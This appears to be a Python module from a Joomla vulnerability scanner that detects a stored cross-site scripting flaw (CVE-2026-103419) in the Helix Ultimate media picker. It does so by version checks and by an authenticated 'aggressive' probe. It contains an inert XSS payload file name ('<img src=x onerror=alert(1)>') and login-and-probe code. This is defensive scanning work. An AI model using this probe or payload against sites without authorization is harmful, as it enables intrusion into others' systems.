from __future__ import annotations

import json
import re
from typing import Any

from ...core.http import HttpClient, form_encode, is_transport_error, normalize_url, transport_error_detail
from ...core.models import Finding
from ...core.versions import parse_version_safe

CVE_ID = "CVE-2026-103419"
NAME = "Helix Ultimate media picker stored cross-site scripting"
COMPONENT = "Helix Ultimate (helixultimate)"
AFFECTED_RULE = "Helix Ultimate 1.0.0 through 2.2.10; fixed in 2.2.11"
HAS_EXPLOIT = True
INTRUSIVE = True
EXPLOIT_MODES = ["safe", "aggressive"]
LOGIN_PAGE = "/index.php?option=com_users&view=login"
LOGIN_POST = "/index.php/component/users?task=user.login"
MEDIA_PATH = "/index.php?option=com_ajax&helix=ultimate&request=task&action=view-media&format=json"
TOKEN_RE = re.compile(r'name="([a-f0-9]{32})" value="1"|"csrf\.token":"([a-f0-9]{32})"')
DEFAULT_MEDIA_NAME = "proofcms103419<img src=x onerror=alert(1)>.png"


def _numeric_version(version: str | None) -> str | None:
    match = re.match(r"\s*(\d+(?:\.\d+)+)", str(version or ""))
    return match.group(1) if match else None


def classify_version(version: str | None) -> str:
    parsed = parse_version_safe(_numeric_version(version))
    fixed = parse_version_safe("2.2.11")
    if parsed is None or fixed is None:
        return "DETECTED_VERSION_UNKNOWN"
    return "LIKELY_VULNERABLE" if parsed < fixed else "NOT_AFFECTED"


def passive_result(plugins: dict[str, Any] | None) -> Finding:
    info = (plugins or {}).get("helixultimate", {})
    if not info.get("found"):
        return Finding(cve=CVE_ID, name=NAME, status="NOT_DETECTED", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, detail="Helix Ultimate was not detected through its manifest or template assets.", action="No action is required unless Helix Ultimate is installed but hidden from public detection.")
    version = info.get("version")
    status = classify_version(version)
    if status == "LIKELY_VULNERABLE":
        detail = f"Detected Helix Ultimate {version}, within the affected range below 2.2.11. Media picker breadcrumbs, folder names and file names are concatenated into HTML without contextual escaping."
        action = "Upgrade Helix Ultimate to 2.2.11 or newer and remove unexpected file names from the media folders."
        confidence = "HIGH"
    elif status == "NOT_AFFECTED":
        detail = f"Detected Helix Ultimate {version}, which escapes media picker paths, folder names and file names."
        action = "No action is required for this CVE if version detection is accurate."
        confidence = "HIGH"
    else:
        detail = "Helix Ultimate was detected, but its version could not be determined."
        action = "Determine the installed Helix Ultimate version and upgrade to 2.2.11 or newer."
        confidence = "MEDIUM"
    return Finding(cve=CVE_ID, name=NAME, status=status, confidence=confidence, component=COMPONENT, component_version=version, affected_rule=AFFECTED_RULE, exploit_available=True, detail=detail, action=action)


def _token(body: str) -> str | None:
    match = TOKEN_RE.search(body)
    if not match:
        return None
    return match.group(1) or match.group(2)


def _frontend_login(client: HttpClient, base: str, username: str, password: str, timeout: int) -> bool:
    page = client.get(f"{base}{LOGIN_PAGE}", timeout=timeout)
    if is_transport_error(page):
        return False
    token = _token(page.get("body") or "")
    if not token:
        return False
    response = client.request(
        f"{base}{LOGIN_POST}",
        method="POST",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        data=form_encode({"username": username, "password": password, token: "1", "return": "aW5kZXgucGhw"}),
        timeout=timeout,
    )
    if is_transport_error(response):
        return False
    body = (response.get("body") or "").lower()
    return "logout" in body or ("com_users" in body and "login" not in body[:200])


def run_aggressive_probe(
    target_url: str,
    username: str | None = None,
    password: str | None = None,
    media_path: str = "/images",
    media_name: str = DEFAULT_MEDIA_NAME,
    timeout: int = 12,
    proxy: str | None = None,
) -> Finding:
    """Read the media picker listing and check for an unescaped file name.

    The picker builds ``data-path``/``data-preview``/``<img>`` markup from the
    file names returned by ``Folder::files()``. A file named with an HTML tag
    is therefore stored XSS when an administrator opens the picker. 2.2.11
    wraps the breadcrumb, folder and file values in ``htmlspecialchars``.
    The probe uses a seeded inert file name and does not create or delete it.
    """
    base = normalize_url(target_url)
    if not username or not password:
        return Finding(cve=CVE_ID, name=NAME, status="BLOCKED_EXTERNAL", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=False, proof_url=f"{base}{LOGIN_PAGE}", detail="The media picker proof needs an administrator session. Pass --aggressive-arg username=... password=... on an authorized staging site. Nothing was sent.", action="Re-run with lab administrator credentials and a seeded media file name.")

    client = HttpClient(timeout=timeout, proxy=proxy)
    if not _frontend_login(client, base, username, password, timeout):
        return Finding(cve=CVE_ID, name=NAME, status="NOT_CONFIRMED", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=f"{base}{LOGIN_PAGE}", detail="The frontend login did not establish an administrator session; the media picker probe was not attempted.", action="Verify the lab credentials and frontend login route.")

    page = client.get(f"{base}/index.php", timeout=timeout)
    if is_transport_error(page):
        return Finding(cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=f"{base}/index.php", detail=f"The homepage failed in transit ({transport_error_detail(page)}).", action="Retry when the target is reachable.")
    token = _token(page.get("body") or "")
    if not token:
        return Finding(cve=CVE_ID, name=NAME, status="BLOCKED_EXTERNAL", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=f"{base}{MEDIA_PATH}", detail="The administrator session did not expose a CSRF token for the media picker.", action="Verify the session token handling on an authorized staging site.")

    response = client.request(
        f"{base}{MEDIA_PATH}",
        method="POST",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        data=form_encode({token: "1", "path": media_path}),
        timeout=timeout,
    )
    if is_transport_error(response):
        return Finding(cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=f"{base}{MEDIA_PATH}", detail=f"The media picker request failed in transit ({transport_error_detail(response)}).", action="Retry when the target is reachable.")

    body = response.get("body") or ""
    try:
        parsed = json.loads(body)
    except (json.JSONDecodeError, TypeError):
        parsed = {}
    output = parsed.get("output") if isinstance(parsed, dict) else None
    html_output = output if isinstance(output, str) else body
    escaped_name = media_name.replace("<", "&lt;").replace(">", "&gt;")
    raw_tag = media_name in html_output
    escaped_tag = escaped_name in html_output
    evidence = {
        "media_path": media_path,
        "media_name": media_name,
        "status": response.get("status"),
        "raw_tag": raw_tag,
        "escaped_tag": escaped_tag,
        "listing_returned": "hu-media" in html_output,
    }
    if raw_tag:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="VULNERABLE",
            confidence="CONFIRMED",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=True,
            exploit_ran=True,
            proof_url=f"{base}{MEDIA_PATH}",
            evidence=evidence,
            detail=(
                "The media picker returned a seeded file name containing an HTML tag without escaping it. "
                "The name is injected into data-path, data-preview and the preview <img> markup, so an "
                "administrator opening the picker executes the stored markup. The probe used an inert tag."
            ),
            action="Upgrade Helix Ultimate to 2.2.11 or newer and remove unexpected media file names.",
        )
    status = "BLOCKED_EXTERNAL" if response.get("status") in (401, 403) else "NOT_CONFIRMED"
    return Finding(
        cve=CVE_ID,
        name=NAME,
        status=status,
        confidence="MEDIUM",
        component=COMPONENT,
        affected_rule=AFFECTED_RULE,
        exploit_available=True,
        exploit_ran=True,
        proof_url=f"{base}{MEDIA_PATH}",
        evidence=evidence,
        detail=(
            "The media picker did not return the seeded name raw. 2.2.11 escapes the value, the file is not "
            "present, or the picker requires a different path."
        ),
        action="Upgrade affected Helix Ultimate versions even when the external proof is inconclusive.",
    )


def run_safe_probe(target_url: str, timeout: int = 12, proxy: str | None = None) -> Finding:
    base = normalize_url(target_url)
    url = f"{base}{MEDIA_PATH}"
    response = HttpClient(timeout=timeout, proxy=proxy).get(url, timeout=timeout)
    if is_transport_error(response):
        return Finding(cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=url, detail=f"The Helix media picker could not be reached ({transport_error_detail(response)}).", action="Retry when the target is reachable.")
    return Finding(cve=CVE_ID, name=NAME, status="BLOCKED_EXTERNAL", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=url, detail="The Helix media picker is reachable; the stored file-name payload was not sent in safe mode.", action="Use aggressive mode with an administrator session and a seeded media file name on an authorized staging site.")


def check(target_url: str, joomla_version: str | None = None, run_exploit_check: bool = False, timeout: int = 12, proxy: str | None = None, exploit_mode: str = "safe", plugins: dict[str, Any] | None = None, aggressive_command: str | None = None, aggressive_args: dict[str, Any] | None = None, **kwargs: Any) -> Finding:
    from ...core.args import aggressive_value

    passive = passive_result(plugins)
    if not run_exploit_check:
        return passive
    if exploit_mode == "aggressive":
        if passive.status not in {"LIKELY_VULNERABLE", "DETECTED_VERSION_UNKNOWN"}:
            passive.detail += " Aggressive proof skipped because Helix Ultimate was not detected as potentially affected."
            return passive
        result = run_aggressive_probe(
            target_url,
            username=aggressive_value(aggressive_args, aggressive_command, "username"),
            password=aggressive_value(aggressive_args, aggressive_command, "password"),
            media_path=aggressive_value(aggressive_args, aggressive_command, "media_path") or "/images",
            media_name=aggressive_value(aggressive_args, aggressive_command, "media_name") or DEFAULT_MEDIA_NAME,
            timeout=timeout,
            proxy=proxy,
        )
        result.component_version = passive.component_version
        return result
    if exploit_mode != "safe":
        passive.detail += " This module supports safe (media picker reachability) and aggressive (seeded media file name) modes."
        return passive
    if passive.status not in {"LIKELY_VULNERABLE", "DETECTED_VERSION_UNKNOWN"}:
        return passive
    result = run_safe_probe(target_url, timeout, proxy)
    result.component_version = passive.component_version
    return result


def metadata() -> dict[str, Any]:
    return {"cve": CVE_ID, "cms": "joomla", "name": NAME, "component": COMPONENT, "affected_rule": AFFECTED_RULE, "affected_joomla_versions": ["*"], "exploit_available": True, "exploit_modes": EXPLOIT_MODES, "intrusive": INTRUSIVE, "vulnerability_type": "Cross-Site Scripting (XSS)", "module_version": "1.0.0", "last_reviewed": "2026-11-18", "updated": "2026-11-18", "required_detectors": ["helixultimate"], "references": ["https://nvd.nist.gov/vuln/detail/CVE-2026-103419", "https://www.joomshaper.com/joomla-templates/helixultimate", "https://github.com/JoomShaper/helix-ultimate/releases/tag/v2.2.11"]}
